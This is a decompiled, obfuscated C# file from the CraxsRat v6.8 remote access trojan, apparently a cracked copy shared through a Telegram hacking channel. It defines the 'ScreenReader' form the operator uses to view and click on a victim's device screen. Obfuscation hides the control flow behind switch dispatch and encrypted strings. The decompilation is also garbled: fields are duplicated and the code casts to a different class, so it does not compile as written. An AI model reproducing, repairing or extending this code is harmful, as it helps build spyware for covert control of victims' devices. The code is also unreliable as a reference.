// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.ScreenReader
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class ScreenReader : Form
  {
    public Client Classclient;
    private IContainer components;
    public string SelectedLang;
    private IContainer components;
    private IContainer components;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((ScreenShoter) this).components = (IContainer) new System.ComponentModel.Container();
      this.viewpanel = new Panel();
label_1:
      int num1 = -227843389;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(((num1 ^ -(-1941105965 * 877858248 - -970071511 * 1705023274 - 1769113764 - 1819697061)) - (~(-2060591485 * 2146909503) - (1600573661 * -158555797 - (2084681611 - 1610583493)) - ~~~775920592)) * -514249817 - (~1729465267 - ~25068222)) * 1862850055)) % 112U)
        {
          case 0:
            this.Panel1 = new Panel();
            this.DrakeUIButtonIcon1 = new DrakeUIButtonIcon();
            this.DrakeUIButtonIcon3 = new DrakeUIButtonIcon();
            this.DrakeUIButtonIcon4 = new DrakeUIButtonIcon();
            num1 = (int) num2 * -1068820329 ^ 763946424;
            continue;
          case 1:
            this.DrakeUIButtonIcon3.RectSelectedColor = Color.White;
            num1 = (int) num2 * -1436382069 ^ 540981042;
            continue;
          case 2:
            this.SuspendLayout();
            this.viewpanel.BackColor = Color.Black;
            num1 = (int) num2 * -1812832274 ^ 74133688;
            continue;
          case 3:
            this.DrakeUIButtonIcon2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon2.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon2.Location = new Point(196, 15);
            num1 = (int) num2 * -343743837 ^ -328217621;
            continue;
          case 4:
            this.Panel1.Margin = new Padding(4);
            this.Panel1.Name = EXGuarder.\u00355210F2C;
            this.Panel1.Size = new Size(564, 69);
            num1 = (int) num2 * 1194034386 ^ -1712744350;
            continue;
          case 5:
            this.DrakeUIButtonIcon2.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.DrakeUIButtonIcon2.RectHoverColor = Color.White;
            this.DrakeUIButtonIcon2.RectPressColor = Color.White;
            num1 = (int) num2 * -2005561403 ^ 1667719767;
            continue;
          case 6:
            this.Timer1 = new Timer(((ScreenShoter) this).components);
            num1 = (int) num2 * -761678252 ^ 863704020;
            continue;
          case 7:
            this.DrakeUIButtonIcon4.Radius = 25;
            this.DrakeUIButtonIcon4.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1219347084 ^ -344240634;
            continue;
          case 8:
            this.viewpanel.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1063693242 ^ -33881525;
            continue;
          case 9:
            this.enablebtn.Text = EXGuarder.\u0033D084818;
            num1 = (int) num2 * -1007548825 ^ -1289206919;
            continue;
          case 10:
            this.disablebtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 85193534 ^ 2100723301;
            continue;
          case 11:
            this.DrakeUIButtonIcon3.RectHoverColor = Color.White;
            this.DrakeUIButtonIcon3.RectPressColor = Color.White;
            num1 = (int) num2 * 614684006 ^ -1923310497;
            continue;
          case 12:
            this.disablebtn.Size = new Size(172, 32);
            this.disablebtn.Style = UIStyle.Custom;
            num1 = (int) num2 * 942356496 ^ -1860596383;
            continue;
          case 13:
            this.DrakeUIButtonIcon3.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon3.Font = new Font(EXGuarder.\u00305732C5E, 12f);
            num1 = (int) num2 * -1687001691 ^ -575932927;
            continue;
          case 14:
            this.DrakeUIButtonIcon4.Size = new Size(172, 32);
            this.DrakeUIButtonIcon4.Style = UIStyle.Custom;
            this.DrakeUIButtonIcon4.Symbol = 61696;
            num1 = (int) num2 * -334031146 ^ -2090604421;
            continue;
          case 15:
            this.Panel1.Controls.Add((Control) this.DrakeUIButtonIcon4);
            this.Panel1.Dock = DockStyle.Bottom;
            this.Panel1.Location = new Point(0, 772);
            num1 = (int) num2 * 45436453 ^ 2001006243;
            continue;
          case 16:
            this.enablebtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 7215189 ^ 726900464;
            continue;
          case 17:
            this.disablebtn.Radius = 25;
            num1 = (int) num2 * -1608403804 ^ 235405100;
            continue;
          case 18:
            this.viewpanel.Location = new Point(0, 69);
            num1 = (int) num2 * -986844301 ^ -257981539;
            continue;
          case 19:
            this.DrakeUIButtonIcon4.TabIndex = 20;
            num1 = (int) num2 * -1827499497 ^ 1049278996;
            continue;
          case 20:
            this.DrakeUIButtonIcon3.Text = EXGuarder.\u0031114052D;
            num1 = (int) num2 * -395391574 ^ 1407751180;
            continue;
          case 21:
            this.Panel2.Controls.Add((Control) this.enablebtn);
            num1 = (int) num2 * -443186299 ^ 1080167180;
            continue;
          case 22:
            this.DrakeUIButtonIcon3.FillColor = Color.Black;
            this.DrakeUIButtonIcon3.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.DrakeUIButtonIcon3.FillPressColor = Color.Black;
            num1 = (int) num2 * -1185255905 ^ 197741579;
            continue;
          case 23:
            goto label_3;
          case 24:
            this.DrakeUIButtonIcon4.Location = new Point(16, 15);
            this.DrakeUIButtonIcon4.Margin = new Padding(4);
            num1 = (int) num2 * 1492765340 ^ 1243570882;
            continue;
          case 25:
            this.DrakeUIButtonIcon2.Cursor = Cursors.Hand;
            this.DrakeUIButtonIcon2.FillColor = Color.Black;
            this.DrakeUIButtonIcon2.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.DrakeUIButtonIcon2.FillPressColor = Color.Black;
            this.DrakeUIButtonIcon2.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon2.Font = new Font(EXGuarder.\u00305732C5E, 12f);
            num1 = (int) num2 * 792861301 ^ -2056803886;
            continue;
          case 26:
            this.Panel2.Controls.Add((Control) this.DrakeUIButtonIcon2);
            this.Panel2.Controls.Add((Control) this.disablebtn);
            num1 = (int) num2 * 1981622053 ^ -2135742949;
            continue;
          case 27:
            this.DrakeUIButtonIcon1.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -941029671 ^ 341648287;
            continue;
          case 28:
            this.enablebtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1191287650 ^ -1786632223;
            continue;
          case 29:
            this.DrakeUIButtonIcon4.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.DrakeUIButtonIcon4.FillPressColor = Color.Black;
            this.DrakeUIButtonIcon4.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon4.Font = new Font(EXGuarder.\u00305732C5E, 12f);
            num1 = (int) num2 * -1527309728 ^ -930482068;
            continue;
          case 30:
            this.DrakeUIButtonIcon4.Name = EXGuarder.\u0036B796E00;
            num1 = (int) num2 * -1847087038 ^ -909900025;
            continue;
          case 31:
            this.Panel2 = new Panel();
            this.DrakeUIButtonIcon2 = new DrakeUIButtonIcon();
            this.disablebtn = new DrakeUIButtonIcon();
            num1 = (int) num2 * -1420785129 ^ -1668300197;
            continue;
          case 32:
            this.DrakeUIButtonIcon4.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon4.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 667393708 ^ -1824610764;
            continue;
          case 33:
            this.Panel1.SuspendLayout();
            num1 = (int) num2 * -1045076562 ^ -473869072;
            continue;
          case 34:
            this.DrakeUIButtonIcon2.RectSelectedColor = Color.White;
            num1 = (int) num2 * -483647452 ^ 524861279;
            continue;
          case 35:
            this.enablebtn.Cursor = Cursors.Hand;
            this.enablebtn.FillColor = Color.Black;
            this.enablebtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * -540243231 ^ -2101542771;
            continue;
          case 36:
            this.disablebtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.disablebtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -922392988 ^ 1713600477;
            continue;
          case 37:
            this.DrakeUIButtonIcon1.Symbol = 57353;
            this.DrakeUIButtonIcon1.TabIndex = 22;
            num1 = (int) num2 * -863227134 ^ -118479431;
            continue;
          case 38:
            this.DrakeUIButtonIcon4.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 1963277592 ^ 907115851;
            continue;
          case 39:
            this.viewpanel.ForeColor = Color.White;
            num1 = (int) num2 * -139889830 ^ -2125503592;
            continue;
          case 40:
            this.Panel2.Name = EXGuarder.\u0031D285A31;
            num1 = (int) num2 * 1915520886 ^ -1591453471;
            continue;
          case 41:
            this.enablebtn.RectSelectedColor = Color.White;
            this.enablebtn.Size = new Size(172, 32);
            num1 = (int) num2 * 2111658623 ^ 1358950542;
            continue;
          case 42:
            this.Timer1.Interval = 1000;
            num1 = (int) num2 * -1372053077 ^ -905609967;
            continue;
          case 43:
            this.DrakeUIButtonIcon2.Size = new Size(172, 32);
            num1 = (int) num2 * -1078087166 ^ 845841895;
            continue;
          case 44:
            this.disablebtn.RectSelectedColor = Color.White;
            num1 = (int) num2 * 781409411 ^ 1877918612;
            continue;
          case 45:
            this.DrakeUIButtonIcon2.Style = UIStyle.Custom;
            num1 = (int) num2 * -625656991 ^ -2124998580;
            continue;
          case 46:
            this.disablebtn.TabIndex = 21;
            this.disablebtn.Text = EXGuarder.\u0032164036C;
            num1 = (int) num2 * -1002216434 ^ 2115744267;
            continue;
          case 47:
            this.DrakeUIButtonIcon2.Radius = 25;
            num1 = (int) num2 * 1115202761 ^ -1426718619;
            continue;
          case 48:
            this.DrakeUIButtonIcon1.Location = new Point(196, 15);
            num1 = (int) num2 * -365764594 ^ 1418528859;
            continue;
          case 49:
            this.Text = EXGuarder.\u00339146E6D;
            num1 = (int) num2 * 943759071 ^ 1310606468;
            continue;
          case 50:
            this.Panel2.Margin = new Padding(4, 4, 4, 4);
            num1 = (int) num2 * -1288303092 ^ 804989612;
            continue;
          case 51:
            this.Margin = new Padding(4, 4, 4, 4);
            num1 = (int) num2 * -371249420 ^ 853829769;
            continue;
          case 52:
            this.Panel2.SuspendLayout();
            num1 = (int) num2 * 559577159 ^ 2084700225;
            continue;
          case 53:
            this.DrakeUIButtonIcon3.Size = new Size(172, 32);
            this.DrakeUIButtonIcon3.Style = UIStyle.Custom;
            this.DrakeUIButtonIcon3.Symbol = 61641;
            num1 = (int) num2 * -758129287 ^ -126812007;
            continue;
          case 54:
            this.enablebtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.enablebtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.enablebtn.RectHoverColor = Color.White;
            num1 = (int) num2 * 415585140 ^ 152450215;
            continue;
          case 55:
            this.Panel2.ResumeLayout(false);
            this.Panel1.ResumeLayout(false);
            this.ResumeLayout(false);
            num1 = (int) num2 * -1054092492 ^ -1587977289;
            continue;
          case 56:
            this.disablebtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.disablebtn.Location = new Point(376, 15);
            num1 = (int) num2 * 1397199792 ^ -418348150;
            continue;
          case 57:
            this.disablebtn.FillPressColor = Color.Black;
            num1 = (int) num2 * -1728228087 ^ 876939927;
            continue;
          case 58:
            this.DrakeUIButtonIcon1.Font = new Font(EXGuarder.\u00305732C5E, 12f);
            this.DrakeUIButtonIcon1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 2052670369 ^ 481266509;
            continue;
          case 59:
            this.Panel2.Location = new Point(0, 0);
            num1 = (int) num2 * -995131726 ^ -185112920;
            continue;
          case 60:
            this.enablebtn.Radius = 25;
            num1 = (int) num2 * 1563079024 ^ -845628198;
            continue;
          case 61:
            this.DrakeUIButtonIcon2.Symbol = 57469;
            this.DrakeUIButtonIcon2.TabIndex = 22;
            num1 = (int) num2 * -204386080 ^ -239641677;
            continue;
          case 62:
            this.DrakeUIButtonIcon2.Margin = new Padding(4, 4, 4, 4);
            this.DrakeUIButtonIcon2.Name = EXGuarder.\u00345751906;
            num1 = (int) num2 * -1371393868 ^ 1307979;
            continue;
          case 63:
            this.ShowIcon = false;
            num1 = (int) num2 * -955600775 ^ -951511782;
            continue;
          case 64:
            this.enablebtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1352941070 ^ -668737752;
            continue;
          case 65:
            this.DrakeUIButtonIcon1.FillPressColor = Color.Black;
            this.DrakeUIButtonIcon1.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1269891939 ^ -1096927675;
            continue;
          case 66:
            this.enablebtn.FillPressColor = Color.Black;
            num1 = (int) num2 * 755536421 ^ 254937078;
            continue;
          case 67:
            this.DrakeUIButtonIcon3.Name = EXGuarder.\u00300455C22;
            num1 = (int) num2 * -302255309 ^ -518000181;
            continue;
          case 68:
            this.enablebtn.TabIndex = 20;
            num1 = (int) num2 * -1611927095 ^ -191387999;
            continue;
          case 69:
            this.disablebtn.Font = new Font(EXGuarder.\u00305732C5E, 12f);
            this.disablebtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1814500270 ^ -368670846;
            continue;
          case 70:
            this.disablebtn.Margin = new Padding(4, 4, 4, 4);
            this.disablebtn.Name = EXGuarder.\u0033114142F;
            num1 = (int) num2 * 1980101043 ^ -875640545;
            continue;
          case 71:
            this.DrakeUIButtonIcon1.Margin = new Padding(4);
            this.DrakeUIButtonIcon1.Name = EXGuarder.\u003065E5D75;
            this.DrakeUIButtonIcon1.Radius = 25;
            this.DrakeUIButtonIcon1.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 371035957 ^ -1367847163;
            continue;
          case 72:
            this.viewpanel.TabIndex = 0;
            num1 = (int) num2 * -778722874 ^ 944013543;
            continue;
          case 73:
            this.Panel2.Dock = DockStyle.Top;
            num1 = (int) num2 * -983736836 ^ 1184204955;
            continue;
          case 74:
            this.DrakeUIButtonIcon3.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon3.Location = new Point(376, 15);
            this.DrakeUIButtonIcon3.Margin = new Padding(4);
            num1 = (int) num2 * -1917581233 ^ -524486343;
            continue;
          case 75:
            this.enablebtn.Margin = new Padding(4, 4, 4, 4);
            this.enablebtn.Name = EXGuarder.\u0030C330819;
            num1 = (int) num2 * -589818519 ^ 717231683;
            continue;
          case 76:
            this.Panel2.TabIndex = 0;
            num1 = (int) num2 * -1621654571 ^ -1993452711;
            continue;
          case 77:
            this.Panel2.Size = new Size(564, 69);
            num1 = (int) num2 * 709618094 ^ 1644974486;
            continue;
          case 78:
            this.DrakeUIButtonIcon2.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -745801205 ^ 1289189315;
            continue;
          case 79:
            this.DrakeUIButtonIcon2.Text = EXGuarder.\u00336497817;
            this.disablebtn.Cursor = Cursors.Hand;
            this.disablebtn.FillColor = Color.Black;
            num1 = (int) num2 * -1801787142 ^ -879567912;
            continue;
          case 80:
            this.DrakeUIButtonIcon1.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * -1109112371 ^ 627052173;
            continue;
          case 81:
            this.disablebtn.RectHoverColor = Color.White;
            num1 = (int) num2 * 73297191 ^ -1356078182;
            continue;
          case 82:
            this.enablebtn.Symbol = 61671;
            num1 = (int) num2 * 1367962160 ^ -1012831688;
            continue;
          case 83:
            this.Panel1.BackColor = Color.Black;
            this.Panel1.Controls.Add((Control) this.DrakeUIButtonIcon1);
            num1 = (int) num2 * 1820631227 ^ 999227977;
            continue;
          case 84:
            this.Panel1.Controls.Add((Control) this.DrakeUIButtonIcon3);
            num1 = (int) num2 * -587524222 ^ -1303055813;
            continue;
          case 85:
            this.enablebtn.Style = UIStyle.Custom;
            num1 = (int) num2 * -1570951728 ^ -2082583202;
            continue;
          case 86:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(564, 841);
            this.Controls.Add((Control) this.viewpanel);
            this.Controls.Add((Control) this.Panel1);
            this.Controls.Add((Control) this.Panel2);
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            num1 = (int) num2 * -2147409965 ^ -284820979;
            continue;
          case 87:
            this.DrakeUIButtonIcon4.RectHoverColor = Color.White;
            this.DrakeUIButtonIcon4.RectPressColor = Color.White;
            num1 = (int) num2 * -868571079 ^ 1153244234;
            continue;
          case 88:
            this.DrakeUIButtonIcon4.Cursor = Cursors.Hand;
            this.DrakeUIButtonIcon4.FillColor = Color.Black;
            num1 = (int) num2 * -208550701 ^ -1225493159;
            continue;
          case 89:
            this.DrakeUIButtonIcon4.RectSelectedColor = Color.White;
            num1 = (int) num2 * -2043887284 ^ 1250923006;
            continue;
          case 90:
            this.DrakeUIButtonIcon1.Size = new Size(172, 32);
            this.DrakeUIButtonIcon1.Style = UIStyle.Custom;
            num1 = (int) num2 * -443851223 ^ -982037341;
            continue;
          case 91:
            this.Panel2.BackColor = Color.Black;
            num1 = (int) num2 * -845044081 ^ 1242362707;
            continue;
          case 92:
            goto label_1;
          case 93:
            this.disablebtn.Symbol = 61534;
            num1 = (int) num2 * -1398893379 ^ 1610568379;
            continue;
          case 94:
            this.DrakeUIButtonIcon3.Radius = 25;
            this.DrakeUIButtonIcon3.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon3.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 2029252554 ^ 487147611;
            continue;
          case 95:
            this.DrakeUIButtonIcon3.Cursor = Cursors.Hand;
            num1 = (int) num2 * -530239305 ^ -1111090125;
            continue;
          case 96:
            this.DrakeUIButtonIcon1.RectPressColor = Color.White;
            this.DrakeUIButtonIcon1.RectSelectedColor = Color.White;
            num1 = (int) num2 * 332378206 ^ -487677306;
            continue;
          case 97:
            this.disablebtn.RectPressColor = Color.White;
            num1 = (int) num2 * -1390510038 ^ 1873141770;
            continue;
          case 98:
            this.disablebtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * 1822030121 ^ 895997655;
            continue;
          case 99:
            this.enablebtn.RectPressColor = Color.White;
            num1 = (int) num2 * 1969664531 ^ -967612564;
            continue;
          case 100:
            this.enablebtn.Font = new Font(EXGuarder.\u00305732C5E, 12f);
            num1 = (int) num2 * 1774560917 ^ 1815054760;
            continue;
          case 101:
            this.enablebtn.Location = new Point(16, 15);
            num1 = (int) num2 * -1997017324 ^ 1264678563;
            continue;
          case 102:
            this.Panel1.TabIndex = 1;
            this.DrakeUIButtonIcon1.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1111690784 ^ -1099888985;
            continue;
          case 103:
            this.viewpanel.Margin = new Padding(4, 4, 4, 4);
            this.viewpanel.Name = EXGuarder.\u00345782979;
            this.viewpanel.Size = new Size(564, 703);
            num1 = (int) num2 * -1687081869 ^ -1629506911;
            continue;
          case 104:
            this.DrakeUIButtonIcon3.TabIndex = 21;
            num1 = (int) num2 * 569710359 ^ 580925712;
            continue;
          case 105:
            this.Name = EXGuarder.\u0031267382C;
            num1 = (int) num2 * -314302745 ^ 277581244;
            continue;
          case 106:
            this.DrakeUIButtonIcon1.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.DrakeUIButtonIcon1.RectHoverColor = Color.White;
            num1 = (int) num2 * 1916969969 ^ 1985787526;
            continue;
          case 107:
            this.DrakeUIButtonIcon1.FillColor = Color.Black;
            num1 = (int) num2 * -519971315 ^ 216533907;
            continue;
          case 108:
            this.DrakeUIButtonIcon3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1195867747 ^ -150864022;
            continue;
          case 109:
            this.DrakeUIButtonIcon4.Text = EXGuarder.\u00351314C56;
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num2 * 25065309 ^ -1973965725;
            continue;
          case 110:
            this.enablebtn = new DrakeUIButtonIcon();
            num1 = (int) num2 * -708268720 ^ 1299397226;
            continue;
          case 111:
            this.DrakeUIButtonIcon1.Text = EXGuarder.\u0033B152359;
            num1 = (int) num2 * 884467674 ^ 1815884773;
            continue;
          default:
            goto label_114;
        }
      }
label_3:
      return;
label_114:;
    }

    internal virtual Panel viewpanel
    {
      get => ((ScreenShoter) this)._viewpanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler1 = new MouseEventHandler(this.Viewpanel_MouseDown);
        MouseEventHandler mouseEventHandler2 = new MouseEventHandler(this.Viewpanel_MouseMove);
        MouseEventHandler mouseEventHandler3 = new MouseEventHandler(this.Viewpanel_MouseUp);
label_1:
        int num1 = 1128780178;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Panel viewpanel;
          switch ((num3 = (uint) (~((1185890161 - (num2 + -(-149214357 * -892886859 - (-456470517 ^ 2043448580) + (-246972702 - 359583753 - (-2019862842 ^ -303815738)) - (-(629226635 - 1555772803) ^ -(76669545 - -1990638491))) - (-(-1663878478 * 2091223551) - 742760136 * 1908137959 * -870049601 - (-465018047 * 1300543043 + (1041410433 + 1041370024) ^ 1765459502 * -838846059)))) * -541014539) * -1126547943)) % 12U)
          {
            case 0:
              int num4 = viewpanel == null ? -1216594465 : (num4 = -1083472803);
              num1 = num4 ^ (int) num3 * 1871687173;
              continue;
            case 1:
              viewpanel.MouseUp -= mouseEventHandler3;
              num1 = (int) num3 * 1004150207 ^ 2052484828;
              continue;
            case 2:
              viewpanel.MouseMove += mouseEventHandler2;
              num1 = (int) num3 * -434861152 ^ 1258883141;
              continue;
            case 3:
              viewpanel = ((ScreenShoter) this)._viewpanel;
              num1 = (int) num3 * 1195411276 ^ -1935409125;
              continue;
            case 4:
              goto label_1;
            case 5:
              viewpanel.MouseDown += mouseEventHandler1;
              num1 = (int) num3 * 2060868473 ^ 1171985844;
              continue;
            case 6:
              viewpanel.MouseUp += mouseEventHandler3;
              num1 = (int) num3 * 1259229487 ^ 87127448;
              continue;
            case 7:
              viewpanel.MouseMove -= mouseEventHandler2;
              num1 = (int) num3 * 1099674118 ^ 971181842;
              continue;
            case 8:
              ((ScreenShoter) this)._viewpanel = value;
              viewpanel = ((ScreenShoter) this)._viewpanel;
              num1 = 855880756;
              continue;
            case 9:
              int num5 = viewpanel == null ? -1187820211 : (num5 = -921492385);
              num1 = num5 ^ (int) num3 * 267047887;
              continue;
            case 10:
              viewpanel.MouseDown -= mouseEventHandler1;
              num1 = (int) num3 * 327150710 ^ -1574902454;
              continue;
            case 11:
              goto label_3;
            default:
              goto label_14;
          }
        }
label_3:
        return;
label_14:;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((ScreenShoter) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._Panel2 = value;
    }

    internal virtual DrakeUIButtonIcon disablebtn
    {
      get => ((ScreenShoter) this)._disablebtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
label_1:
        int num1 = 1731844386;
        DrakeUIButtonIcon disablebtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-((num1 ^ -(-(-395843932 ^ --875249124) + -(469037797 * -1892170158) * -1186054715)) + 1411907898 * -591118733 - (817037741 ^ ---1474286514)) - 420497191)) % 7U)
          {
            case 0:
              disablebtn.Click -= eventHandler;
              num1 = (int) num2 * 190079821 ^ 241962354;
              continue;
            case 1:
              disablebtn = ((ScreenShoter) this)._disablebtn;
              int num3 = disablebtn == null ? 1388112560 : (num3 = 1423563741);
              num1 = num3 ^ (int) num2 * -1463675188;
              continue;
            case 2:
              int num4 = disablebtn == null ? 1205012542 : (num4 = 2000635056);
              num1 = num4 ^ (int) num2 * -725442439;
              continue;
            case 3:
              goto label_1;
            case 4:
              disablebtn.Click += eventHandler;
              num1 = (int) num2 * -651022473 ^ -102534487;
              continue;
            case 5:
              goto label_3;
            case 6:
              ((ScreenShoter) this)._disablebtn = value;
              disablebtn = ((ScreenShoter) this)._disablebtn;
              num1 = 1006607953;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon enablebtn
    {
      get => ((ScreenShoter) this)._enablebtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsaxrftyu);
label_1:
        int num1 = -1687156633;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon enablebtn;
          switch ((num3 = (uint) (((~(~980627189 - 2013710642 - ~-1503999133 * -18646199) - (num2 ^ ~(187189186 - 1319751207) - 562852738 - -(~647614881 - 243624565 * 1973445823) ^ -1671588047 * (~-755412673 - 1329837295 * -423485425 - --1447533121))) * -202225987 ^ 1439405518 + 1438324649 ^ -307124014 ^ 1400836441) * -180143065 - 1729921964)) % 7U)
          {
            case 0:
              enablebtn = ((ScreenShoter) this)._enablebtn;
              int num4 = enablebtn == null ? 1088060529 : (num4 = -4896342);
              num1 = num4 ^ (int) num3 * 118178582;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              enablebtn.Click += eventHandler;
              num1 = (int) num3 * 1697984815 ^ -1658034317;
              continue;
            case 4:
              enablebtn.Click -= eventHandler;
              num1 = (int) num3 * -1006703059 ^ -1037822483;
              continue;
            case 5:
              enablebtn = ((ScreenShoter) this)._enablebtn;
              int num5 = enablebtn == null ? 1353919998 : (num5 = -927616267);
              num1 = num5 ^ (int) num3 * 2097223366;
              continue;
            case 6:
              ((ScreenShoter) this)._enablebtn = value;
              num1 = -2059753856;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
    {
      get => ((ScreenShoter) this)._DrakeUIButtonIcon2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon2_Click);
label_1:
        int num1 = -1227931870;
        DrakeUIButtonIcon drakeUiButtonIcon2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~((num1 - (-(~(-1244996540 ^ 2081934465) - -1998326233) + -(-1441858930 ^ 1330809719 - -1403818010 ^ -712413704 * 464877031)) - 2053875261 * -292016029) * -1208084411 * -976453713) + 13662689)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              drakeUiButtonIcon2 = ((ScreenShoter) this)._DrakeUIButtonIcon2;
              num1 = (int) num2 * -287374503 ^ 1457729767;
              continue;
            case 2:
              ((ScreenShoter) this)._DrakeUIButtonIcon2 = value;
              drakeUiButtonIcon2 = ((ScreenShoter) this)._DrakeUIButtonIcon2;
              num1 = -1163729647;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num3 = drakeUiButtonIcon2 == null ? -563447727 : (num3 = -35642212);
              num1 = num3 ^ (int) num2 * -1218940531;
              continue;
            case 5:
              int num4 = drakeUiButtonIcon2 == null ? 648284043 : (num4 = -1449414929);
              num1 = num4 ^ (int) num2 * 549942964;
              continue;
            case 6:
              drakeUiButtonIcon2.Click -= eventHandler;
              num1 = (int) num2 * -178943485 ^ 1599669549;
              continue;
            case 7:
              drakeUiButtonIcon2.Click += eventHandler;
              num1 = (int) num2 * 727334971 ^ 542764264;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Timer Timer1
    {
      get => ((ScreenShoter) this)._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
label_1:
        int num1 = -1340895282;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Timer timer1;
          switch ((num3 = (uint) ((851219666 - 2006616415) * -2079987241 - -((-(384289018 * -625991457) - (-480124569 + (--1679985004 - (-305107221 - 1136215621)) * 150246287) - num2) * -1985811365) - -1412757931)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              timer1 = ((ScreenShoter) this)._Timer1;
              int num4 = timer1 == null ? -2120591083 : (num4 = 2056232400);
              num1 = num4 ^ (int) num3 * 658068631;
              continue;
            case 2:
              timer1.Tick += eventHandler;
              num1 = (int) num3 * -1382664725 ^ -818183453;
              continue;
            case 3:
              timer1 = ((ScreenShoter) this)._Timer1;
              num1 = (int) num3 * -573743780 ^ -776474608;
              continue;
            case 4:
              goto label_3;
            case 5:
              ((ScreenShoter) this)._Timer1 = value;
              num1 = 2024463440;
              continue;
            case 6:
              timer1.Tick -= eventHandler;
              num1 = (int) num3 * 2018917337 ^ 569853332;
              continue;
            case 7:
              int num5 = timer1 == null ? 1288476178 : (num5 = -1746845196);
              num1 = num5 ^ (int) num3 * 934841969;
              continue;
            default:
              goto label_10;
          }
        }
